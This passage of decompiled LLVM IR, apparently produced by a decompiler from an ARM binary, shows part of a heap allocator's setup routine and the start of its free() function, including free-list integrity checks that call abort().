  %v3_12c5c = inttoptr i32 %v2_12c5c to i32*
  store i32 %v0_12c5c, i32* %v3_12c5c, align 4
  %v0_12c60 = load i32, i32* %lr.global-to-local, align 4
  %v1_12c60 = load i32, i32* %r5.global-to-local, align 4
  %v2_12c60 = add i32 %v1_12c60, %v0_12c60
  store i32 %v2_12c60, i32* %lr.global-to-local, align 4
  %v0_12c68.pre = load i32, i32* @r0, align 4
  %v0_12c6c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12c64

dec_label_pc_12c64:                               ; preds = %dec_label_pc_12c14, %dec_label_pc_12c58
  %v0_12cdc = phi i32 [ %v1_12c18, %dec_label_pc_12c14 ], [ %v2_12c60, %dec_label_pc_12c58 ]
  %v0_12c6c = phi i32 [ %v3_12c28, %dec_label_pc_12c14 ], [ %v0_12c6c.pre, %dec_label_pc_12c58 ]
  %v1_12c80 = phi i32 [ %v2_12c1c, %dec_label_pc_12c14 ], [ %v0_12c68.pre, %dec_label_pc_12c58 ]
  %v0_12c64 = load i32, i32* @r4, align 4
  %v1_12c64 = add i32 %v0_12c64, 44
  %v2_12c64 = inttoptr i32 %v1_12c64 to i32*
  %v3_12c64 = load i32, i32* %v2_12c64, align 4
  store i32 %v3_12c64, i32* %r3.global-to-local, align 4
  %v9_12c68 = icmp eq i32 %v1_12c80, %v3_12c64
  %v1_12c6c = and i32 %v0_12c6c, -4
  store i32 %v1_12c6c, i32* %r5.global-to-local, align 4
  br i1 %v9_12c68, label %dec_label_pc_12cdc, label %dec_label_pc_12c74

dec_label_pc_12c74:                               ; preds = %dec_label_pc_12c64
  %v2_12c74 = add i32 %v1_12c80, %v1_12c6c
  store i32 %v2_12c74, i32* %r3.global-to-local, align 4
  %v1_12c78 = add i32 %v2_12c74, 4
  %v2_12c78 = inttoptr i32 %v1_12c78 to i32*
  %v3_12c78 = load i32, i32* %v2_12c78, align 4
  store i32 %v3_12c78, i32* %r3.global-to-local, align 4
  %v1_12c7c = urem i32 %v3_12c78, 2
  %v2_12c7c = icmp eq i32 %v1_12c7c, 0
  %v2_12c80 = add i32 %v1_12c80, 4
  %v3_12c80 = inttoptr i32 %v2_12c80 to i32*
  store i32 %v1_12c6c, i32* %v3_12c80, align 4
  br i1 %v2_12c7c, label %dec_label_pc_12c88, label %dec_label_pc_12c74.dec_label_pc_12cb8_crit_edge

dec_label_pc_12c74.dec_label_pc_12cb8_crit_edge:  ; preds = %dec_label_pc_12c74
  %v0_12cbc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12cb8

dec_label_pc_12c88:                               ; preds = %dec_label_pc_12c74
  %v0_12c88 = load i32, i32* @r0, align 4
  %v1_12c88 = add i32 %v0_12c88, 8
  %v2_12c88 = inttoptr i32 %v1_12c88 to i32*
  %v3_12c88 = load i32, i32* %v2_12c88, align 4
  store i32 %v3_12c88, i32* %ip.global-to-local, align 4
  %v1_12c8c = add i32 %v3_12c88, 12
  %v2_12c8c = inttoptr i32 %v1_12c8c to i32*
  %v3_12c8c = load i32, i32* %v2_12c8c, align 4
  store i32 %v3_12c8c, i32* %r3.global-to-local, align 4
  %v9_12c90 = icmp eq i32 %v3_12c8c, %v0_12c88
  %v1_12c94 = add i32 %v0_12c88, 12
  %v2_12c94 = inttoptr i32 %v1_12c94 to i32*
  %v3_12c94 = load i32, i32* %v2_12c94, align 4
  store i32 %v3_12c94, i32* %r2.global-to-local, align 4
  br i1 %v9_12c90, label %dec_label_pc_12c9c, label %dec_label_pc_12ca8

dec_label_pc_12c9c:                               ; preds = %dec_label_pc_12c88
  %v1_12c9c = add i32 %v3_12c94, 8
  %v2_12c9c = inttoptr i32 %v1_12c9c to i32*
  %v3_12c9c = load i32, i32* %v2_12c9c, align 4
  store i32 %v3_12c9c, i32* %r3.global-to-local, align 4
  %v9_12ca0 = icmp eq i32 %v3_12c9c, %v0_12c88
  br i1 %v9_12ca0, label %dec_label_pc_12cac, label %dec_label_pc_12ca8

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12c88, %dec_label_pc_12c4c, %dec_label_pc_12c30, %dec_label_pc_12c9c
  %v0_12ca8 = call i32 @abort()
  store i32 %v0_12ca8, i32* @r0, align 4
  %v0_12cac.pre = load i32, i32* @ip, align 4
  %v1_12cac.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12cac

dec_label_pc_12cac:                               ; preds = %dec_label_pc_12c9c, %dec_label_pc_12ca8
  %v1_12cac = phi i32 [ %v3_12c94, %dec_label_pc_12c9c ], [ %v1_12cac.pre, %dec_label_pc_12ca8 ]
  %v0_12cac = phi i32 [ %v3_12c88, %dec_label_pc_12c9c ], [ %v0_12cac.pre, %dec_label_pc_12ca8 ]
  %v2_12cac = add i32 %v1_12cac, 8
  %v3_12cac = inttoptr i32 %v2_12cac to i32*
  store i32 %v0_12cac, i32* %v3_12cac, align 4
  %v0_12cb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12cb0 = load i32, i32* %ip.global-to-local, align 4
  %v2_12cb0 = add i32 %v1_12cb0, 12
  %v3_12cb0 = inttoptr i32 %v2_12cb0 to i32*
  store i32 %v0_12cb0, i32* %v3_12cb0, align 4
  %v0_12cb4 = load i32, i32* %lr.global-to-local, align 4
  %v1_12cb4 = load i32, i32* %r5.global-to-local, align 4
  %v2_12cb4 = add i32 %v1_12cb4, %v0_12cb4
  store i32 %v2_12cb4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12cb8

dec_label_pc_12cb8:                               ; preds = %dec_label_pc_12c74.dec_label_pc_12cb8_crit_edge, %dec_label_pc_12cac
  %v0_12cbc = phi i32 [ %v0_12cbc.pre, %dec_label_pc_12c74.dec_label_pc_12cb8_crit_edge ], [ %v2_12cb4, %dec_label_pc_12cac ]
  %v0_12cb8 = load i32, i32* %r7.global-to-local, align 4
  %v1_12cb8 = add i32 %v0_12cb8, 8
  %v2_12cb8 = inttoptr i32 %v1_12cb8 to i32*
  %v3_12cb8 = load i32, i32* %v2_12cb8, align 4
  store i32 %v3_12cb8, i32* %r2.global-to-local, align 4
  %v1_12cbc = or i32 %v0_12cbc, 1
  store i32 %v1_12cbc, i32* %r3.global-to-local, align 4
  %v0_12cc0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12cc0, i32* %v2_12cb8, align 4
  %v0_12cc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_12cc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_12cc4 = add i32 %v1_12cc4, 12
  %v3_12cc4 = inttoptr i32 %v2_12cc4 to i32*
  store i32 %v0_12cc4, i32* %v3_12cc4, align 4
  %v0_12cc8 = load i32, i32* %lr.global-to-local, align 4
  %v1_12cc8 = load i32, i32* %r1.global-to-local, align 4
  %v3_12cc8 = add i32 %v1_12cc8, %v0_12cc8
  %v4_12cc8 = inttoptr i32 %v3_12cc8 to i32*
  store i32 %v0_12cc8, i32* %v4_12cc8, align 4
  %v0_12ccc = load i32, i32* %r3.global-to-local, align 4
  %v1_12ccc = load i32, i32* %r1.global-to-local, align 4
  %v2_12ccc = add i32 %v1_12ccc, 4
  %v3_12ccc = inttoptr i32 %v2_12ccc to i32*
  store i32 %v0_12ccc, i32* %v3_12ccc, align 4
  %v0_12cd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12cd0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12cd0 = add i32 %v1_12cd0, 8
  %v3_12cd0 = inttoptr i32 %v2_12cd0 to i32*
  store i32 %v0_12cd0, i32* %v3_12cd0, align 4
  %v0_12cd4 = load i32, i32* %r7.global-to-local, align 4
  %v1_12cd4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12cd4 = add i32 %v1_12cd4, 12
  %v3_12cd4 = inttoptr i32 %v2_12cd4 to i32*
  store i32 %v0_12cd4, i32* %v3_12cd4, align 4
  br label %dec_label_pc_12cec

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12c64
  %v2_12cdc = add i32 %v1_12c6c, %v0_12cdc
  %v1_12ce0 = or i32 %v2_12cdc, 1
  store i32 %v1_12ce0, i32* %r3.global-to-local, align 4
  %v1_12ce4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12ce4 = add i32 %v1_12ce4, 4
  %v3_12ce4 = inttoptr i32 %v2_12ce4 to i32*
  store i32 %v1_12ce0, i32* %v3_12ce4, align 4
  %v0_12ce8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12ce8 = load i32, i32* @r4, align 4
  %v2_12ce8 = add i32 %v1_12ce8, 44
  %v3_12ce8 = inttoptr i32 %v2_12ce8 to i32*
  store i32 %v0_12ce8, i32* %v3_12ce8, align 4
  br label %dec_label_pc_12cec

dec_label_pc_12cec:                               ; preds = %dec_label_pc_12cb8, %dec_label_pc_12cdc
  %v0_12cec = load i32, i32* %sl.global-to-local, align 4
  %v2_12cec = icmp eq i32 %v0_12cec, 0
  store i32 %v0_12cec, i32* %r1.global-to-local, align 4
  br i1 %v2_12cec, label %dec_label_pc_12cf8.loopexit, label %dec_label_pc_12c14

dec_label_pc_12cf8.loopexit:                      ; preds = %dec_label_pc_12cec
  %v0_12cf8.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_12cf8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12cf8

dec_label_pc_12cf8:                               ; preds = %dec_label_pc_12cf8.loopexit, %dec_label_pc_12c04
  %v1_12cf8 = phi i32 [ %v1_12cf8.pre, %dec_label_pc_12cf8.loopexit ], [ %v1_12cf810, %dec_label_pc_12c04 ]
  %v0_12d00 = phi i32 [ %v0_12cf8.pre, %dec_label_pc_12cf8.loopexit ], [ %v1_12c10, %dec_label_pc_12c04 ]
  %v9_12cf8 = icmp eq i32 %v0_12d00, %v1_12cf8
  br i1 %v9_12cf8, label %dec_label_pc_12d70, label %dec_label_pc_12d00

dec_label_pc_12d00:                               ; preds = %dec_label_pc_12cf8
  %v1_12d00 = add i32 %v0_12d00, 4
  store i32 %v1_12d00, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12c04

dec_label_pc_12d08.dec_label_pc_12d08_crit_edge:  ; preds = %dec_label_pc_12d08.preheader, %dec_label_pc_12d08.dec_label_pc_12d08_crit_edge
  %v0_12d08.pre = load i32, i32* @r4, align 4
  %v1_12d08.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_12d08 = mul i32 %v1_12d08.pre, 8
  %v5_12d08 = add i32 %v4_12d08, %v0_12d08.pre
  %v1_12d0c = add i32 %v1_12d08.pre, 1
  store i32 %v1_12d0c, i32* %r2.global-to-local, align 4
  %v1_12d10 = add i32 %v5_12d08, 44
  store i32 %v1_12d10, i32* %r3.global-to-local, align 4
  %v2_12d18 = add i32 %v5_12d08, 52
  %v3_12d18 = inttoptr i32 %v2_12d18 to i32*
  store i32 %v1_12d10, i32* %v3_12d18, align 4
  %v0_12d1c = load i32, i32* %r3.global-to-local, align 4
  %v2_12d1c = add i32 %v0_12d1c, 12
  %v3_12d1c = inttoptr i32 %v2_12d1c to i32*
  store i32 %v0_12d1c, i32* %v3_12d1c, align 4
  %v7_12d20 = icmp sgt i32 %v1_12d0c, 95
  br i1 %v7_12d20, label %dec_label_pc_12d24, label %dec_label_pc_12d08.dec_label_pc_12d08_crit_edge

dec_label_pc_12d24:                               ; preds = %dec_label_pc_12d08.dec_label_pc_12d08_crit_edge
  %v0_12d24 = load i32, i32* @r4, align 4
  %v1_12d24 = inttoptr i32 %v0_12d24 to i32*
  %v2_12d24 = load i32, i32* %v1_12d24, align 4
  store i32 %v2_12d24, i32* %r2.global-to-local, align 4
  %v1_12d28 = add i32 %v0_12d24, 864
  %v2_12d28 = inttoptr i32 %v1_12d28 to i32*
  %v3_12d28 = load i32, i32* %v2_12d28, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12d30 = urem i32 %v2_12d24, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_12d38 = or i32 %v3_12d28, 1
  store i32 %v1_12d38, i32* %r1.global-to-local, align 4
  %v1_12d3c = or i32 %v1_12d30, 72
  store i32 %v1_12d3c, i32* %r2.global-to-local, align 4
  %v1_12d40 = add i32 %v0_12d24, 52
  store i32 %v1_12d40, i32* %ip.global-to-local, align 4
  %v2_12d44 = add i32 %v0_12d24, 840
  %v3_12d44 = inttoptr i32 %v2_12d44 to i32*
  store i32 0, i32* %v3_12d44, align 4
  %v0_12d48 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d48 = add i32 %v0_12d48, 65536
  store i32 %v1_12d48, i32* %r3.global-to-local, align 4
  %v0_12d4c = load i32, i32* %r0.global-to-local, align 4
  %v1_12d4c = load i32, i32* @r4, align 4
  %v2_12d4c = add i32 %v1_12d4c, 836
  %v3_12d4c = inttoptr i32 %v2_12d4c to i32*
  store i32 %v0_12d4c, i32* %v3_12d4c, align 4
  %v0_12d50 = load i32, i32* %r0.global-to-local, align 4
  %v1_12d50 = load i32, i32* @r4, align 4
  %v2_12d50 = add i32 %v1_12d50, 844
  %v3_12d50 = inttoptr i32 %v2_12d50 to i32*
  store i32 %v0_12d50, i32* %v3_12d50, align 4
  %v1_12d54 = load i32, i32* @r4, align 4
  %v2_12d54 = add i32 %v1_12d54, 852
  %v3_12d54 = inttoptr i32 %v2_12d54 to i32*
  store i32 %v1_12d48, i32* %v3_12d54, align 4
  %v1_12d58 = load i32, i32* @r4, align 4
  %v2_12d58 = add i32 %v1_12d58, 864
  %v3_12d58 = inttoptr i32 %v2_12d58 to i32*
  store i32 %v1_12d38, i32* %v3_12d58, align 4
  %v1_12d5c = load i32, i32* @r4, align 4
  %v2_12d5c = inttoptr i32 %v1_12d5c to i32*
  store i32 %v1_12d3c, i32* %v2_12d5c, align 4
  %v0_12d60 = load i32, i32* %ip.global-to-local, align 4
  %v1_12d60 = load i32, i32* @r4, align 4
  %v2_12d60 = add i32 %v1_12d60, 44
  %v3_12d60 = inttoptr i32 %v2_12d60 to i32*
  store i32 %v0_12d60, i32* %v3_12d60, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_12d68 = call i32 @sysconf(i32 30, i32 %v1_12d38, i32 %v1_12d3c, i32 %v1_12d48)
  store i32 %v4_12d68, i32* @r0, align 4
  %v1_12d6c = load i32, i32* @r4, align 4
  %v2_12d6c = add i32 %v1_12d6c, 860
  %v3_12d6c = inttoptr i32 %v2_12d6c to i32*
  store i32 %v4_12d68, i32* %v3_12d6c, align 4
  br label %dec_label_pc_12d70

dec_label_pc_12d70:                               ; preds = %dec_label_pc_12cf8, %dec_label_pc_12d24
  %v2_12d74 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12d74, i32* @r4, align 4
  %v1_12d78 = load i32, i32* @r0, align 4
  ret i32 %v1_12d78

; uselistorder directives
  uselistorder i32 %v0_12d24, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12d1c, { 1, 0 }
  uselistorder i32 %v1_12d00, { 1, 0 }
  uselistorder i32 %v0_12cec, { 0, 2, 1 }
  uselistorder i32 %v0_12cc8, { 1, 0 }
  uselistorder i32 %v1_12c18, { 1, 0, 2 }
  uselistorder i32 %v0_12c30, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12bf0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 17, 2, 10, 6, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 8, 9, 7 }
  uselistorder label %dec_label_pc_12d70, { 1, 0 }
  uselistorder label %dec_label_pc_12d08.dec_label_pc_12d08_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12cec, { 1, 0 }
  uselistorder label %dec_label_pc_12cb8, { 1, 0 }
  uselistorder label %dec_label_pc_12cac, { 1, 0 }
  uselistorder label %dec_label_pc_12ca8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12c64, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12d7c = load i32, i32* @r4, align 4
  %v6_12d7c = load i32, i32* @r5, align 4
  %v9_12d7c = load i32, i32* @r6, align 4
  %v12_12d7c = load i32, i32* @r7, align 4
  %v18_12d7c = load i32, i32* @lr, align 4
  %v0_12d84 = load i32, i32* @r0, align 4
  store i32 %v0_12d84, i32* @r6, align 4
  %v2_12d84 = icmp eq i32 %v0_12d84, 0
  %v2_12d88 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r7, align 4
  br i1 %v2_12d84, label %dec_label_pc_12f90, label %dec_label_pc_12d94

dec_label_pc_12d94:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_12d98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 108) to i32*), align 4
  store i32 %v4_12d98, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_12d98, i32* %r2.global-to-local, align 4
  %v4_12da4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 68) to i32*), align 4
  store i32 %v4_12da4, i32* %r1.global-to-local, align 4
  store i32 %v2_12d88, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12db0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 112) to i32*), align 4
  store i32 %v4_12db0, i32* %ip.global-to-local, align 4
  store i32 77244, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12db0)
  %v0_12dbc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12dbc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_12dc4 = load i32, i32* @r7, align 4
  %v2_12dc4 = add i32 %v0_12dc4, 16
  %v3_12dc4 = inttoptr i32 %v2_12dc4 to i32*
  %v4_12dc4 = load i32, i32* %v3_12dc4, align 4
  store i32 %v4_12dc4, i32* %ip.global-to-local, align 4
  store i32 77264, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12dc4)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12dd4 = load i32, i32* @r7, align 4
  %v2_12dd4 = add i32 %v0_12dd4, 64
  %v3_12dd4 = inttoptr i32 %v2_12dd4 to i32*
  %v4_12dd4 = load i32, i32* %v3_12dd4, align 4
  store i32 %v4_12dd4, i32* @lr, align 4
  %v0_12dd8 = load i32, i32* @r6, align 4
  %v1_12dd8 = add i32 %v0_12dd8, -4
  %v2_12dd8 = inttoptr i32 %v1_12dd8 to i32*
  %v3_12dd8 = load i32, i32* %v2_12dd8, align 4
  store i32 %v3_12dd8, i32* %r2.global-to-local, align 4
  %v1_12ddc = inttoptr i32 %v4_12dd4 to i32*
  %v2_12ddc = load i32, i32* %v1_12ddc, align 4
  store i32 %v2_12ddc, i32* %r3.global-to-local, align 4
  %v1_12de0 = and i32 %v3_12dd8, -4
  store i32 %v1_12de0, i32* %ip.global-to-local, align 4
  %v1_12de4 = add i32 %v0_12dd8, -8
  store i32 %v1_12de4, i32* @r5, align 4
  store i32 %v1_12de4, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12de0, %v2_12ddc
  br i1 %tmp, label %dec_label_pc_12e14, label %dec_label_pc_12df4

dec_label_pc_12df4:                               ; preds = %dec_label_pc_12d94
  %v1_12df4 = or i32 %v2_12ddc, 3
  store i32 %v1_12df4, i32* %r3.global-to-local, align 4
  store i32 %v1_12df4, i32* %v1_12ddc, align 4
  %v3_12df8 = load i32, i32* @lr, align 4
  %v4_12df8 = add i32 %v3_12df8, -8
  store i32 %v4_12df8, i32* %lr.global-to-local, align 4
  %v0_12dfc = load i32, i32* %ip.global-to-local, align 4
  %v3_12dfc = udiv i32 %v0_12dfc, 8
  store i32 %v3_12dfc, i32* %r1.global-to-local, align 4
  %v1_12e00 = add i32 %v3_12df8, -4
  store i32 %v1_12e00, i32* %r2.global-to-local, align 4
  %v4_12e04 = mul nuw i32 %v3_12dfc, 4
  %v5_12e04 = add i32 %v4_12e04, %v1_12e00
  %v6_12e04 = inttoptr i32 %v5_12e04 to i32*
  %v7_12e04 = load i32, i32* %v6_12e04, align 4
  store i32 %v7_12e04, i32* %r3.global-to-local, align 4
  %v1_12e08 = load i32, i32* @r5, align 4
  %v2_12e08 = add i32 %v1_12e08, 8
  %v3_12e08 = inttoptr i32 %v2_12e08 to i32*
  store i32 %v7_12e04, i32* %v3_12e08, align 4
  %v0_12e0c = load i32, i32* @r5, align 4
  %v1_12e0c = load i32, i32* %r2.global-to-local, align 4
  %v2_12e0c = load i32, i32* %r1.global-to-local, align 4
  %v5_12e0c = mul i32 %v2_12e0c, 4
  %v6_12e0c = add i32 %v5_12e0c, %v1_12e0c
  %v7_12e0c = inttoptr i32 %v6_12e0c to i32*
  store i32 %v0_12e0c, i32* %v7_12e0c, align 4
  br label %dec_label_pc_12f78

dec_label_pc_12e14:                               ; preds = %dec_label_pc_12d94
  %v1_12e14 = and i32 %v3_12dd8, 2
  %v2_12e14 = icmp eq i32 %v1_12e14, 0
  br i1 %v2_12e14, label %dec_label_pc_12e1c, label %dec_label_pc_12f50

dec_label_pc_12e1c:                               ; preds = %dec_label_pc_12e14
  %v1_12e1c = or i32 %v2_12ddc, 1
  store i32 %v1_12e1c, i32* %r3.global-to-local, align 4
  store i32 %v1_12e1c, i32* %v1_12ddc, align 4
  %v0_12e24 = load i32, i32* @r6, align 4
  %v1_12e24 = add i32 %v0_12e24, -4
  %v2_12e24 = inttoptr i32 %v1_12e24 to i32*
  %v3_12e24 = load i32, i32* %v2_12e24, align 4
  store i32 %v3_12e24, i32* %r3.global-to-local, align 4
  %v0_12e28 = load i32, i32* @r5, align 4
  %v1_12e28 = load i32, i32* %ip.global-to-local, align 4
  %v2_12e28 = add i32 %v1_12e28, %v0_12e28
  store i32 %v2_12e28, i32* %lr.global-to-local, align 4
  %v1_12e2c = urem i32 %v3_12e24, 2
  %v2_12e2c = icmp eq i32 %v1_12e2c, 0
  %v1_12e30 = add i32 %v2_12e28, 4
  %v2_12e30 = inttoptr i32 %v1_12e30 to i32*
  %v3_12e30 = load i32, i32* %v2_12e30, align 4
  store i32 %v3_12e30, i32* %r8.global-to-local, align 4
  br i1 %v2_12e2c, label %dec_label_pc_12e38, label %dec_label_pc_12e6c

dec_label_pc_12e38:                               ; preds = %dec_label_pc_12e1c
  %v1_12e38 = add i32 %v0_12e24, -8
  %v2_12e38 = inttoptr i32 %v1_12e38 to i32*
  %v3_12e38 = load i32, i32* %v2_12e38, align 4
  store i32 %v3_12e38, i32* %r1.global-to-local, align 4
  %v2_12e3c = sub i32 %v0_12e28, %v3_12e38
  store i32 %v2_12e3c, i32* %r3.global-to-local, align 4
  %v1_12e40 = add i32 %v2_12e3c, 8
  %v2_12e40 = inttoptr i32 %v1_12e40 to i32*
  %v3_12e40 = load i32, i32* %v2_12e40, align 4
  store i32 %v3_12e40, i32* %r2.global-to-local, align 4
  %v1_12e44 = add i32 %v3_12e40, 12
  %v2_12e44 = inttoptr i32 %v1_12e44 to i32*
  %v3_12e44 = load i32, i32* %v2_12e44, align 4
  store i32 %v3_12e44, i32* %r4.global-to-local, align 4
  %v9_12e48 = icmp eq i32 %v3_12e44, %v2_12e3c
  %v1_12e4c = add i32 %v2_12e3c, 12
  %v2_12e4c = inttoptr i32 %v1_12e4c to i32*
  %v3_12e4c = load i32, i32* %v2_12e4c, align 4
  store i32 %v3_12e4c, i32* %r0.global-to-local, align 4
  br i1 %v9_12e48, label %dec_label_pc_12e54, label %dec_label_pc_12eb8

dec_label_pc_12e54:                               ; preds = %dec_label_pc_12e38
  %v1_12e54 = add i32 %v3_12e4c, 8
  %v2_12e54 = inttoptr i32 %v1_12e54 to i32*
  %v3_12e54 = load i32, i32* %v2_12e54, align 4
  store i32 %v3_12e54, i32* %r3.global-to-local, align 4
  %v9_12e58 = icmp eq i32 %v3_12e54, %v2_12e3c
  br i1 %v9_12e58, label %dec_label_pc_12e60, label %dec_label_pc_12eb8

dec_label_pc_12e60:                               ; preds = %dec_label_pc_12e54
  store i32 %v3_12e40, i32* %v2_12e54, align 4
  %v0_12e64 = load i32, i32* %r0.global-to-local, align 4
  %v1_12e64 = load i32, i32* %r2.global-to-local, align 4
  %v2_12e64 = add i32 %v1_12e64, 12
  %v3_12e64 = inttoptr i32 %v2_12e64 to i32*
  store i32 %v0_12e64, i32* %v3_12e64, align 4
  %v0_12e68 = load i32, i32* %ip.global-to-local, align 4
  %v1_12e68 = load i32, i32* %r1.global-to-local, align 4
  %v2_12e68 = add i32 %v1_12e68, %v0_12e68
  store i32 %v2_12e68, i32* %ip.global-to-local, align 4
  %v0_12e78.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_12e7c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12e6c

dec_label_pc_12e6c:                               ; preds = %dec_label_pc_12e1c, %dec_label_pc_12e60
  %v0_12ef8 = phi i32 [ %v1_12e28, %dec_label_pc_12e1c ], [ %v2_12e68, %dec_label_pc_12e60 ]
  %v0_12e7c = phi i32 [ %v3_12e30, %dec_label_pc_12e1c ], [ %v0_12e7c.pre, %dec_label_pc_12e60 ]
  %v1_12e90 = phi i32 [ %v2_12e28, %dec_label_pc_12e1c ], [ %v0_12e78.pre, %dec_label_pc_12e60 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12e70 = load i32, i32* @r7, align 4
  %v2_12e70 = add i32 %v0_12e70, 64
  %v3_12e70 = inttoptr i32 %v2_12e70 to i32*
  %v4_12e70 = load i32, i32* %v3_12e70, align 4
  store i32 %v4_12e70, i32* %r2.global-to-local, align 4
  %v1_12e74 = add i32 %v4_12e70, 44
  %v2_12e74 = inttoptr i32 %v1_12e74 to i32*
  %v3_12e74 = load i32, i32* %v2_12e74, align 4
  store i32 %v3_12e74, i32* %r3.global-to-local, align 4
  %v9_12e78 = icmp eq i32 %v1_12e90, %v3_12e74
  %v1_12e7c = and i32 %v0_12e7c, -4
  store i32 %v1_12e7c, i32* %r0.global-to-local, align 4
  br i1 %v9_12e78, label %dec_label_pc_12ef8, label %dec_label_pc_12e84

dec_label_pc_12e84:                               ; preds = %dec_label_pc_12e6c
  %v2_12e84 = add i32 %v1_12e90, %v1_12e7c
  store i32 %v2_12e84, i32* %r3.global-to-local, align 4
  %v1_12e88 = add i32 %v2_12e84, 4
  %v2_12e88 = inttoptr i32 %v1_12e88 to i32*
  %v3_12e88 = load i32, i32* %v2_12e88, align 4
  store i32 %v3_12e88, i32* %r3.global-to-local, align 4
  %v1_12e8c = urem i32 %v3_12e88, 2
  %v2_12e8c = icmp eq i32 %v1_12e8c, 0
  %v2_12e90 = add i32 %v1_12e90, 4
  %v3_12e90 = inttoptr i32 %v2_12e90 to i32*
  store i32 %v1_12e7c, i32* %v3_12e90, align 4
  br i1 %v2_12e8c, label %dec_label_pc_12e98, label %dec_label_pc_12e84.dec_label_pc_12ec8_crit_edge

dec_label_pc_12e84.dec_label_pc_12ec8_crit_edge:  ; preds = %dec_label_pc_12e84
  %v0_12ed8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ec8

dec_label_pc_12e98:                               ; preds = %dec_label_pc_12e84
  %v0_12e98 = load i32, i32* %lr.global-to-local, align 4
  %v1_12e98 = add i32 %v0_12e98, 8
  %v2_12e98 = inttoptr i32 %v1_12e98 to i32*
  %v3_12e98 = load i32, i32* %v2_12e98, align 4
  store i32 %v3_12e98, i32* %r1.global-to-local, align 4
  %v1_12e9c = add i32 %v3_12e98, 12
  %v2_12e9c = inttoptr i32 %v1_12e9c to i32*
  %v3_12e9c = load i32, i32* %v2_12e9c, align 4
  store i32 %v3_12e9c, i32* %r3.global-to-local, align 4
  %v9_12ea0 = icmp eq i32 %v3_12e9c, %v0_12e98
  %v1_12ea4 = add i32 %v0_12e98, 12
  %v2_12ea4 = inttoptr i32 %v1_12ea4 to i32*
  %v3_12ea4 = load i32, i32* %v2_12ea4, align 4
  store i32 %v3_12ea4, i32* %r2.global-to-local, align 4
  br i1 %v9_12ea0, label %dec_label_pc_12eac, label %dec_label_pc_12eb8

dec_label_pc_12eac:                               ; preds = %dec_label_pc_12e98
  %v1_12eac = add i32 %v3_12ea4, 8
  %v2_12eac = inttoptr i32 %v1_12eac to i32*
  %v3_12eac = load i32, i32* %v2_12eac, align 4
  store i32 %v3_12eac, i32* %r3.global-to-local, align 4
  %v9_12eb0 = icmp eq i32 %v3_12eac, %v0_12e98
  br i1 %v9_12eb0, label %dec_label_pc_12ebc, label %dec_label_pc_12eb8

dec_label_pc_12eb8:                               ; preds = %dec_label_pc_12e98, %dec_label_pc_12e54, %dec_label_pc_12e38, %dec_label_pc_12eac
  %v0_12eb8 = call i32 @abort()
